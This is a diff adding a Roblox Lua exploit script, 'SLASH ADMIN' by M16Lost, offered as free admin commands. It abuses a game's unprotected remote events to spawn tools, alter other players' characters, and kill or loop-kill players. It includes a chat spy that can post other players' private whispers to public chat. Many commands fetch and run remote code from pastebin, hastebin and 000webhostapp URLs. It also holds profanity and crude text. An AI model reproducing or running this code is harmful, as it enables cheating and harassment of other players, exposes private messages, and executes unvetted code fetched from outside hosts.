@@ -1,0 +1,718 @@
+game.Workspace.GiveTool:FireServer(fuckboy, "SuperFlyGoldBoombox")
+game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+  Title = "SLASH ADMIN",
+  Text = "Made by M16Lost",
+  Icon = "rbxassetid://5821992842"})
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    if msg:lower() == ";cmds" then
+		print[[--
+~~~~~~~~ Free Admin By M16Lost#7821 ~~~~~~~~
+
+;cloud --gives u a cloud
+;boombox --gives u a boombox
+;stroller --gives u the stroller
+;shotgun --gives you a black shotgun
+;trxsh --Spawns a picture of a trxsh image
+;m16 -- Weapon
+;berreta --Gives you a berreta pistol
+;axe -- Gives you a cool red and black axe
+;pm --chat spy
+;wmusic --plays music over the workspace
+;gorilla --THICC GORILLA
+;kill -- kills someone
+;lkill --loop kills someone
+;bring  -- Takes plr to you 
+;goto --goes to player
+.fly --makes u fly toggle e
+]]
+    end
+    if msg:lower() == ";shotgun" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Gipxxu1j"))()
+    end
+     if msg:lower() == ";cloud" then--add cmd inside " "
+    game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+    end
+	if msg:lower() == ";pp" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://hastebin.com/raw/epemihunov"))()
+	end
+	if msg:lower() == ";freddy" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://pastebin.com/raw/k4QARDbZ"))()
+	end
+	 if msg:lower() == ";trxsh" then
+	local UserName  = game:GetService('Players').LocalPlayer.Name
+local CE = {}
+local DD = game.Workspace
+local DX = game.Players.LocalPlayer.Character.Torso
+local MEMEID = "http://www.roblox.com/asset/?id=4360546431"
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+game.Workspace.GiveTool:FireServer(XXX, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","0")
+wait(.1)
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"],"Texture",MEMEID)
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"],"Face","Back")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"],"Parent",DX)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Anchored",true)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material","Neon")
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Color",Color3.new(0/255,0/255,0/255))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(10,10,0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"]["roblox"],"Texture",MEMEID)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Parent",DD)
+end
+
+	if msg:lower() == ";drop" then
+	local ToolName = ""
+local Counter = 0
+
+for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+if v:IsA("Tool") then
+Counter = Counter + 1
+ToolName = v.Name
+end
+end
+
+if Counter >= 1 then
+local Tool = game.Players.LocalPlayer.Character[ToolName]
+Tool.Parent = game.Workspace
+warn("Dropped!")
+else
+warn("No tool was found.")
+end
+	end
+	if msg:lower() == "" then
+	end
+	if msg:lower() == "" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet(""))()
+	end
+	if msg:lower() == "" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet(""))()
+	end
+	if msg:lower() == "" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet(""))()
+	end
+	if msg:lower() == "" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet(""))()
+	end
+	if msg:lower() == ";stroller" then
+	game.Workspace.GiveTool:FireServer("7602040", "Stroller")
+    end
+	if msg:lower() == ";boom" then 
+		game.Workspace.GiveTool:FireServer(7602040, "SuperFlyGoldBoombox")
+        game.Workspace.GiveTool:FireServer(7602040, "PompousTheCloud")
+	end
+	if msg:lower() == ";axe" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://pastebin.com/raw/CM9uwQjc"))()
+	end
+	if msg:lower() == ";gorilla" then 
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://pastebin.com/raw/RYHPiqbQ"))()
+	end
+    if msg:lower() == ";rj" then
+        game:GetService("TeleportService"):Teleport(game.PlaceId, 
+        game:GetService("Players").LocalPlayer)
+    end
+    if msg:lower() == ";sbgun" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/d21axhA2"))()
+    end
+	if msg:lower() == ";cage" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/g2V9YVhx"))()
+    end
+	if msg:lower() == ".rtx" then
+	    loadstring(game:HttpGet("https://vtrxgicv.000webhostapp.com/RTX.lua"))()
+	end
+    if msg:lower() == ";slasher" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/rg5Amv16"))()
+    end
+	if msg:lower() == ";heli" then 
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://pastebin.com/raw/sz3re8bQ"))()
+	end
+	if msg:lower() == ";skybox2" then 
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://pastebin.com/raw/tTBpjTAX"))()
+	end
+    if msg:lower() == ";mario" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/iZQayYAv"))()
+    end
+	if msg:lower() == ";iphone6" then
+		game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+		wait()
+		loadstring(game:HttpGet("https://hastebin.com/raw/mekecuxawe"))()
+	end
+    if msg:lower() == ";rage" then
+        while wait() do
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=1392104198")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=741260810")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=400818835")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=606495374")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=2628286951")
+            wait()
+        end
+    end
+    if msg:lower() == ";eyes" then
+        while wait() do
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235875854")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235876174")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235876570")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235877044")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235877318")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235878653")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235878884")
+            wait()
+            workspace.Face:FireServer("http://www.roblox.com/asset/?id=3235879197")
+        end
+    end
+    if msg:lower() == ";tag" then
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF WANT
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+ 
+ 
+function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+ 
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
+        
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+while wait() do
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Arcade")
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"LineHeight",(25))
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15,10,15,10))
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Life is like a penis, Woman make it hard ")
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.00000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.0000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.0000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.00000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.0000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.00000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.0000000001)
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,27,16))
+    wait(0.00000000001)
+   end
+end
+		if msg:lower() == ";fly" then
+     repeat wait()
+   until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
+local mouse = game.Players.LocalPlayer:GetMouse()
+repeat wait() until mouse
+local plr = game.Players.LocalPlayer
+local torso = plr.Character.Torso
+local flying = true
+local deb = true
+local ctrl = {f = 0, b = 0, l = 0, r = 0}
+local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+local maxspeed = 50
+local speed = 0
+
+function Fly()
+local bg = Instance.new("BodyGyro", torso)
+bg.P = 9e4
+bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+bg.cframe = torso.CFrame
+local bv = Instance.new("BodyVelocity", torso)
+bv.velocity = Vector3.new(0,0.1,0)
+bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+repeat wait()
+plr.Character.Humanoid.PlatformStand = true
+if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+speed = speed+.5+(speed/maxspeed)
+if speed > maxspeed then
+speed = maxspeed
+end
+elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
+speed = speed-1
+if speed < 0 then
+speed = 0
+end
+end
+if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
+bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+else
+bv.velocity = Vector3.new(0,0.1,0)
+end
+bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+until not flying
+ctrl = {f = 0, b = 0, l = 0, r = 0}
+lastctrl = {f = 0, b = 0, l = 0, r = 0}
+speed = 0
+bg:Destroy()
+bv:Destroy()
+plr.Character.Humanoid.PlatformStand = false
+end
+mouse.KeyDown:connect(function(key)
+if key:lower() == "e" then
+if flying then flying = false
+else
+flying = true
+Fly()
+end
+elseif key:lower() == "w" then
+ctrl.f = 1
+elseif key:lower() == "s" then
+ctrl.b = -1
+elseif key:lower() == "a" then
+ctrl.l = -1
+elseif key:lower() == "d" then
+ctrl.r = 1
+end
+end)
+mouse.KeyUp:connect(function(key)
+if key:lower() == "w" then
+ctrl.f = 0
+elseif key:lower() == "s" then
+ctrl.b = 0
+elseif key:lower() == "a" then
+ctrl.l = 0
+elseif key:lower() == "d" then
+ctrl.r = 0
+end
+end)
+Fly()
+ 
+    end
+    if msg:lower() == ";berreta" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://pastebin.com/raw/qmFKVZwc"))()
+    end
+    if msg:lower() == ";sm" then
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 465482937
+local texture = 465483155
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","M16Lost was here")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextSize",100)
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15, 0, 5, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Position",UDim2.new(0, -100, 0, -30))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Parent", game.StarterGui.MainGUI)
+end
+    if msg:lower() == ";fat" then
+game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF WANT 
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+	workspace = game:GetService("Workspace"), 
+	players = game:GetService("Players") 
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+
+
+function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
+end
+
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT
+
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Ball")
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Block")
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(2,2,2))
+CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Ball")
+CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Block")
+CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Size",Vector3.new(2,2,2))
+CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Ball")
+CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Block")
+CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Size",Vector3.new(2,2,2))
+CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Ball")
+CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Block")
+CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Size",Vector3.new(2,2,2))
+CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Badll")
+CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Block")
+CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Size",Vector3.new(2,2,2))
+CE:FireEvent("PompousTheCloud",MainUserW["Shirt"],"ShirtTemplate","rbxassetid://249458025")
+CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://280452751")
+    end
+        if msg:lower() == ";pm" then
+        --This script reveals ALL hidden messages in the default chat
+--chat ";spy" to toggle!
+enabled = true
+--if true will check your messages too
+spyOnMyself = true
+--if true will chat the logs publicly (fun, risky)
+public = true
+--if true will use /me to stand out
+publicItalics = true
+--customize private logs
+privateProperties = {
+	Color = Color3.fromRGB(77,27,16); 
+	Font = Enum.Font.SourceSansBold;
+	TextSize = 18;
+}
+--////////////////////////////////////////////////////////////////
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+local instance = (_G.chatSpyInstance or 0) + 1
+_G.chatSpyInstance = instance
+
+local function onChatted(p,msg)
+	if _G.chatSpyInstance == instance then
+		if p==player and msg:lower():sub(1,4)=="/spy" then
+			enabled = not enabled
+			wait(0.3)
+			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+		elseif enabled and (spyOnMyself==true or p~=player) then
+			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+			local hidden = true
+			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+					hidden = false
+				end
+			end)
+			wait(1)
+			conn:Disconnect()
+			if hidden and enabled then
+				if public then
+					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+				else
+					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+				end
+			end
+		end
+	end
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end
+Players.PlayerAdded:Connect(function(p)
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end)
+privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
+local chatFrame = player.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible = true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+    end    
+        if msg:lower() == ";dom" then
+        game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud")
+        wait()
+        loadstring(game:HttpGet("https://hastebin.com/raw/asezaleriy"))()
+    end
+if string.sub(msg,1,6) == ("lnvalid")then
+    while true do 
+        for i = 0,1,0.1 do 
+            game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new(Color3.fromHSV(i,1,1)))    
+            wait(.1)
+        end    
+    end
+end
+if string.sub(msg,1,2) == ("re")then
+    game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(15)
+end
+if string.sub(msg,1,3) == (";rj")then
+game:GetService("TeleportService"):Teleport(game.PlaceId, 
+game:GetService("Players").LocalPlayer)
+end
+local gamepassId = fuckboy
+
+local RobloxianLife = loadstring(game:HttpGetAsync("https://pastebin.com/raw/HTF0vRHF"))()
+local CommandApi = loadstring(game:HttpGetAsync("https://pastebin.com/raw/3mHL7pKv"))()
+local players = game:GetService("Players")
+local localPlayer = players.localPlayer
+
+RobloxianLife:Initialize(gamepassId)
+
+local function strStarts(String,Start)
+    return string.sub(String,1,string.len(Start))==Start
+end
+
+local function getPlayerByName(name)
+    local plrs = {}
+
+    if name == "me" then
+        table.insert(plrs, localPlayer)
+        return plrs
+    elseif name == "others" then
+        for i,v in pairs(players:GetPlayers()) do
+            if v.Name ~= localPlayer.Name then
+                table.insert(plrs, v)
+            end
+        end
+        return plrs
+    elseif name == "all" then
+        for i,v in pairs(players:GetPlayers()) do
+            table.insert(plrs, v)
+        end
+        return plrs
+    elseif name == "random" then
+        table.insert(plrs, players:GetPlayers()[math.random(1, #players:GetPlayers())])
+        return plrs
+    end
+
+    for i,v in pairs(players:GetPlayers()) do
+        if strStarts(v.Name, name) then
+            table.insert(plrs, v)
+        end
+    end
+    return plrs
+end
+
+CommandApi:AddCommand("lnvalid", function(name)
+    for i,v in pairs(getPlayerByName(name)) do
+        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid, "HipHeight", 0.1)
+        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid.RootPart.RootJoint, "Part1", v.Character:FindFirstChild'Torso' and v.Character.Torso or v.Character.LowerTorso)
+    end
+end)
+
+CommandApi:AddCommand("lnvalid", function(mult) 
+    mult = tonumber(mult)
+    if not mult then return end
+
+    local function multiplycf(cf, m)
+        return CFrame.new(cf.p*m)*CFrame.fromOrientation(cf:ToOrientation())
+    end
+
+    for i,v in pairs(localPlayer.Character:GetDescendants()) do
+        if v:isA"BasePart" then
+            RobloxianLife:SetLocalProperty(v,"Size", v.Size*mult)
+        elseif v:isA"Motor6D" then
+            RobloxianLife:SetLocalProperty(v,"C0", multiplycf(v.C0, mult))
+            RobloxianLife:SetLocalProperty(v,"C1", multiplycf(v.C1, mult))
+        end
+    end
+end)
+
+ local chatConnection = localPlayer.Chatted:Connect(CommandApi.OnChatted)
+
+end)
+a=fuckboy
+prefix = ";"
+lplayer = game.Players.LocalPlayer
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+
+function GetPlayer(String)
+    local Found = {}
+    local strl = String:lower()
+    if strl == "all" then
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name ~= lplayer.Name then
+                table.insert(Found,v)
+            end
+        end   
+    elseif strl == "me" then
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name == lplayer.Name then
+                table.insert(Found,v)
+            end
+        end  
+    else
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name:lower():sub(1, #String) == String:lower() then
+                table.insert(Found,v)
+            end
+        end    
+    end
+    return Found    
+end
+if string.sub(msg,1,6)==prefix.."goto " then
+for i, v in pairs(GetPlayer(string.sub(msg, 7))) do
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame    
+end
+end;
+
+if string.sub(msg,1,7)==prefix.."lkill "then 
+for f,g in pairs(GetPlayer(string.sub(msg,8)))do 
+local C=game:GetService('Players').LocalPlayer.Name
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})end
+_G.lkill=true
+while _G.lkill do 
+game.Workspace.GiveTool:FireServer(a,"PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()wait(0)
+end 
+end 
+end;
+
+if string.sub(msg,1,8)==prefix.."wmusic "then 
+local C=game:GetService('Players').LocalPlayer.Name;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+E.workspace.Buy:FireServer(0,"PompousTheCloud")
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoomBox")then 
+game.Workspace.GiveTool:FireServer(a,"SuperFlyGoldBoombox")
+E.players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox").Parent=E.players.LocalPlayer.Character;
+local X=E.players.LocalPlayer.Character:WaitForChild("SuperFlyGoldBoombox").Handle.BoomboxSound;
+local Y=X.Parent.Parent.Remote;
+Y:FireServer("PlaySong",string.sub(msg,9))
+wait(1)
+D:FireEvent("PompousTheCloud",G["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Parent",E.players.LocalPlayer.Character)
+D:FireEvent("PompousTheCloud",G["SuperFlyGoldBoombox"],"Parent",E.players.LocalPlayer.Backpack)
+D:FireEvent("PompousTheCloud",G["BoomboxSound"],"Name","NOOB")
+D:FireEvent("PompousTheCloud",G["NOOB"],"Playing",false)
+D:FireEvent("PompousTheCloud",G["NOOB"],"Volume",10)
+D:FireEvent("PompousTheCloud",G["NOOB"],"PlayBackLoudness",5)
+D:FireEvent("PompousTheCloud",G["NOOB"],"Looped",false)
+D:FireEvent("PompousTheCloud",G["NOOB"],"Playing",true)
+E.players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox"):Destroy()
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
+end 
+end;
+
+if string.sub(msg,1,6)==prefix.."reap "then
+game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud") 
+for f,g in pairs(GetPlayer(string.sub(msg,7)))do
+ game:GetService("ReplicatedStorage"):FindFirstChild("AvatarEditor"):FindFirstChild("HatHandle"):FireServer(14129625)
+wait() 
+local C=game:GetService('Players').LocalPlayer.Name;
+local P,Q=5779369040,2675785344;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+wait(0.1)
+D:FireEvent("PompousTheCloud",G["14129625"]["Handle"],"Transparency",0)
+    D:FireEvent("PompousTheCloud",G["14129625"]["Handle"]["Mesh"],"Scale",Vector3.new(1.5,1.5,1.5))
+    D:FireEvent("PompousTheCloud",G["14129625"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..P)
+    D:FireEvent("PompousTheCloud",G["14129625"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Q)
+    D:FireEvent("PompousTheCloud",G["14129625"]["Handle"],"Anchored",true)
+    D:FireEvent("PompousTheCloud",G["14129625"],"Parent",game.Players[g.Name].Character)
+    game.Players.LocalPlayer.Character["14129625"]:Remove()
+    game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
+game.Workspace.GiveTool:FireServer(fuckboy, "PompousTheCloud")
+    end
+end
+
+if string.sub(msg,1,7)==prefix.."bring "then
+game.workspace.GiveTool:FireServer("fuckboy", "PompousTheCloud") 
+for f,g in pairs(GetPlayer(string.sub(msg,8)))do 
+local C=game:GetService('Players').LocalPlayer.Name;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
